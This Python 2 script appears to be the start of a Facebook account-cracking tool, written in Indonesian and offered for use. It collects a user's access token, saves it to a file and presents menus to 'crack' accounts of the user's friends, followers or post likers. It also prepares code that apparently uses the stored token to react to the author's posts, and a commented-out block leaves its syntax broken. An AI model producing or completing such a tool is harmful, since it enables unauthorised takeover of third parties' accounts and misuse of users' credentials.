#!/usr/bin/python
# -*- coding: utf-8
#recode ? izin dulu su
#fb.me/gaaaarzxd
#tinggal pake ngapain recode, nnti error
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
	import requests
except ImportError:
        os.system("pip2 install requests")
        exit(" [+] Silakan Ketik : python2 crack.py")

reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

logo = """\033[0;91m  ██████╗███████╗██████╗ ██╗██████╗ 
\033[0;91m ██╔════╝██╔════╝██╔══██╗██║██╔══██╗
\033[0;91m ██║     █████╗  ██████╔╝██║██║  ██║
\033[0;97m ██║     ██╔══╝  ██╔══██╗██║██║  ██║
\033[0;97m ╚██████╗██║     ██████╔╝██║██████╔╝
\033[0;97m  ╚═════╝╚═╝     ╚═════╝ ╚═╝╚═════╝  \033[0;97mVERSION : \033[0;93mV2.2\033[0;97m
 [*] Jika Ingin Cek Hasil Ketik : python2 crack.py result\n
 [#] Author    : Angga Kurniawan
 [#] GitHub    : https://github.com/anggaxd
 [#] ------------------------------------------------
 [#] Instagram : @gaaarzxd
 [#] Facebook  : https://fb.me/gaaaarzxd"""""

id = []
cp = []
ok = []

### DURASI LICENSE BRO
#durasi = str(datetime.now().strftime('%d-%m-%Y'))
#license = requests.get("https://raw.githubusercontent.com/avsid/ambf/main/license.php").text
#dev_angga = requests.get("https://raw.githubusercontent.com/avsid/ambf/main/durasi.php").text
#response = " \033[0;97m[\033[0;93m!\033[0;97m] Mohon Tunggu Sebentar Lagi Update Script."
#year_to_expire = int(dev_angga) ## angga kurniawan
#try:
	#assert int(durasi.split('-')[-1]) == year_to_expire, response
#except AssertionError as e:
	os.system("clear")
	print logo

def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' [!] Token invalid'
        os.system('rm -rf login.txt')
    una = '100015073506062'
    post = '1031861840659590'
    post2 = '1110619372783836'
    #kom = 'GW PAKE SC LU BANG ðŸ˜˜\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl'
    #kom2 = 'KEREN BANG 😍😍\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl'
    reac = 'LOVE'
    menu()
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		token = raw_input("\n [+] Your Token : ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (' [â€¢] Token Benar') 
			raw_input (' [>] Tekan Enter Ke Menu')
			bot_komen()
		except KeyError:
			print (" [!] Token Invalid") 
			sys.exit()

def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		time.sleep(3)
		tokenz()
	except requests.exceptions.ConnectionError:
		print ('  [!] Tidak Ada Koneksi')
		sys.exit()
	print logo
	print "\n [ Selamat Datang \033[0;93m"+nama+"\033[0;97m ]\n"
	print " [1] Crack Dari Publik Teman"
	print " [2] Crack Dari Total Followers"
	print " [3] Crack Dari Like Postingan"
	print " [0] Logout"
	
